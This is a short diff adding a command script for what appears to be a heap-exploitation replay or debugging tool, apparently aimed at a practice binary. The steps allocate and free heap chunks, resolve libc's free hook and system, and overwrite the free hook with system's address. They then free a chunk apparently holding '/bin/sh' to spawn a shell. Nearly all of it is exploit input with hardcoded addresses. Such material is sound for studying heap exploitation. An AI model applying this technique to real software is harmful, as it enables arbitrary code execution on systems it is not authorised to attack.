@@ -1,0 +1,33 @@
+c
+w 1
+w 0x500
+fork m500
+w 1
+w 0x10
+fork m10
+
+w 3
+w 0x555555559260
+
+w 8
+w 0x555555559260
+w 8
+
+fork beforeoverwritingfreehook
+
+tree
+
+w 0
+w 7
+p libc:free_hoo
+w 0x7ffff7fa88e8
+w 8
+p libc:system
+w b'\xc0\xf9\xe2\xf7\xff\x7f\x00\x00'
+
+fork beforefreebinsh
+
+w 3
+trace *
+w 0x7ffff7f6c519
+
